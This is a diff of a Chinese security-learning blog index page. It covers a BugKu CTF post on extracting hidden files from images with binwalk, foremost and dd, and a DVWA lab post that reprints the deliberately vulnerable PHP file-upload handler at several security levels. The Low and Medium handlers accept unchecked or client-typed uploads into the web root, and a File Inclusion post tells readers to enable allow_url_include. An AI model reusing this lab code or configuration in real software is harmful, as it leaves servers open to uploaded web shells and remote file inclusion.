@@ -134,106 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
-<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>像这张图片，发现隐藏着flag.txt</p>
-<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
-<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
-<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
-<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
-<p><strong>if</strong>：要提取分离的文件</p>
-<p><strong>of</strong>：输出的文件</p>
-<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
-<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
-<hr>
-<p>这篇文章只做简单的介绍</p>
-<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-BugKuCTF—杂项题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -445,6 +345,193 @@
 
 
   
+    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
+  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
+<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
+<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
+<p>像这张图片，发现隐藏着flag.txt</p>
+<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
+<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
+<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
+<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
+<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
+<p><strong>if</strong>：要提取分离的文件</p>
+<p><strong>of</strong>：输出的文件</p>
+<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
+<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+<hr>
+<p>这篇文章只做简单的介绍</p>
+<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DVWA 5-File Upload（文件上传）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/">DVWA 5-File Upload（文件上传）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/" class="archive-article-date">
+  	<time datetime="2019-02-13T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\upload\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>上传本地文件到服务器</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-1.png" alt="5-1"></p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">	<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">		<span class="comment">// No</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Yes!</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>;</span><br><span class="line">	<span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span></span><br><span class="line">	$target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line">	$temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) );</span><br><span class="line">	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">		<span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123;</span><br><span class="line">			$img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">			imagejpeg( $img, $temp_file, <span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">			imagepng( $img, $temp_file, <span class="number">9</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">		<span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Delete any temp files</span></span><br><span class="line">		<span class="keyword">if</span>( file_exists( $temp_file ) )</span><br><span class="line">			unlink( $temp_file );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/119467.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119467.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DVWA 4-File Inclusion（文件包含）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -465,16 +552,63 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\csrf\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>更改当前用户的密码</p>
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\fi\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>直接点击<code>file1.php、file2.php、file3.php</code>可以相应跳转到不同的界面</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-3.png" alt="4-3"></p>
+<h2 id="开启allow-url-include"><a href="#开启allow-url-include" class="headerlink" title="开启allow_url_include"></a>开启allow_url_include</h2><p>进入之后如果<code>allow_url_include</code>没有开启，会出现如下画面</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-1.png" alt="4-1"></p>
+<p>此时只需要进入<code>phpinfo</code>，查看配置文件的路径，比如我的：<code>C:\phpstudy\php\php-5.4.45\php.ini</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/4-2.png" alt="4-2"></p>
+<p>修改该配置文件中的<code>allow_url_include = On</code>，然后重启服务就可以了</p>
